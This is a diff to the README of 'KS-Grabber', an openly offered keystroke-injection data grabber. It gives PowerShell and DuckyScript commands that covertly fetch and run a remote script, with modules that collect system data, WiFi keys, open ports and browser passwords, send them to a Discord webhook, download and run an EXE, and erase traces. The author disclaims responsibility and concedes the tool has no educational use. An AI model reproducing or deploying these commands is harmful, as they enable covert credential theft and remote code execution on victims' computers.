@@ -7,7 +7,7 @@ KS-Grabber is a keystroke injection grabber that is fully modular and developed 
 Run the following command in PowerShell to execute KS-Grabber:
 
 ```powershell
-$hookurl = '<webhook goes here>'
+$hookUrl = '<webhook goes here>'
 iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content
 ```
 
@@ -16,16 +16,25 @@ iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps
 Before running the script, you need to configure the boolean variables that enable the grabber modules. Open the script and set the following variables:
 
 ```powershell
-$gatherPcData = $true  # Gather PC data
-$gatherWifiProfiles = $true  # Gather WiFi profiles
-$gatherOpenPorts = $true  # Gather open ports
-$removeTraces = $true  # Remove traces
+$gatherPcData = $true  <# Gather PC data #>
+$gatherWifiProfiles = $true  <# Gather WiFi profiles #>
+$gatherOpenPorts = $true  <# Gather open ports #>
+$executeExe = $false  <# Execute and EXE File #>
+$gatherBrowserPass = $false <# [WIP] Gather passwords saved in browsers #>
+$removeTraces = $true  <# Remove traces #>
 ```
 
-**WARNING:** It is mandatory to configure the webhook correctly. Replace the value of the `$hookurl` variable with your webhook:
+You can also change some extra variables according to your preferences regarding the modules:
 
 ```powershell
-$hookurl = "https://discord.com/api/webhooks/wompwomp"
+$keyContentLabel = "Key Content"  <# Only if the system is not in en-us or en-br. #>
+$exeUrl = "https://somerandomwebsite.lol/yourfile.exe" <# The EXE file referring to the executeExe function. #>
+```
+
+**WARNING:** It is mandatory to configure the webhook correctly. Replace the value of the `$hookUrl` variable with your webhook:
+
+```powershell
+$hookUrl = "https://discord.com/api/webhooks/wompwomp"
 ```
 
 Otherwise, the script will not work!
@@ -40,7 +49,7 @@ DELAY 1000
 STRING cmd
 ENTER
 DELAY 1000
-STRING powershell -windowstyle hidden -command "$hookurl = '<webhook goes here>'; iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content"
+STRING powershell -windowstyle hidden -command "$hookUrl = '<webhook goes here>'; iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content"
 ENTER
 ```
 ### ⭐ Made for educational purposes (even though I don't know how it can be used in an educational way), I am not responsible for how this tool is used.
